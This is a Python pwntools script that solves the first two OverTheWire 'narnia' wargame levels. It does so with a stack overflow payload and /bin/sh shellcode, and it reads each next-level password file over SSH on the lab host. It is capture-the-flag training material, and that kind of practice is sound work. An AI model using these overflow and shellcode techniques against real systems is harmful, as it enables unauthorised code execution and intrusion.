#!/usr/bin/env python3

import pwn
import os

doing = pwn.term.output(float=True)
if pwn.context.log_level == pwn.logging.INFO:
    pwn.context(log_level='ERROR')
pwn.context(arch='i386')

solutions = [  # Entry <i> is the solution to narnia<i>
    pwn.flat('A' * 20, 0xdeadbeef),
    pwn.asm(pwn.shellcraft.sh())
]


def ssh_connect(level_id, level_password):
    return pwn.ssh(user='narnia%d' % level_id, password=level_password, host="narnia.labs.overthewire.org", port=2226)


def solve(level_id, level_password, attack):
    doing.update('Solving narnia%d\n' % level_id)
    ssh = ssh_connect(level_id, level_password)
    env = None
    if level_id == 1:
        env = {'EGG': attack}
    process = ssh.process('/narnia/narnia%d' % level_id, env=env)
    if level_id != 1:
        process.send(attack)
    process.recvrepeat(1)
    process.sendline("cat /etc/narnia_pass/narnia%d" % (level_id + 1))
    next_password = process.recvline().strip().decode('utf8')
    process.close()
    ssh.close()
    print('Password for narnia%d is: %s' % (level_id + 1, next_password))
    return next_password


def download_binary_and_source(level_id, level_password):
    out_dir = 'challenges'
    source_file = os.path.join(out_dir, "narnia%d.c" % level_id)
    binary_file = os.path.join(out_dir, "narnia%d" % level_id)
    c_source_exists = os.path.exists(source_file)
    binary_exists = os.path.exists(binary_file)
    if c_source_exists and binary_exists:
        return

    doing.update('Fetching source and binary for narnia%d\n' % level_id)
    ssh = ssh_connect(level_id, level_password)
    pwn.mkdir_p(out_dir)
    if not c_source_exists:
        try:
            ssh.download_file('/narnia/narnia%d.c' % level_id, source_file)
        except:  # Fails on Windows file system, but file has been fetched
            pass
    if not binary_exists:
        try:
            ssh.download_file('/narnia/narnia%d' % level_id, binary_file)
        except:  # Fails on Windows file system, but file has been fetched
            pass
    ssh.close()


password = 'narnia0'
i = -1
for i in range(0, len(solutions)):
    download_binary_and_source(i, password)
    password = solve(i, password, solutions[i])

download_binary_and_source(i+1, password)
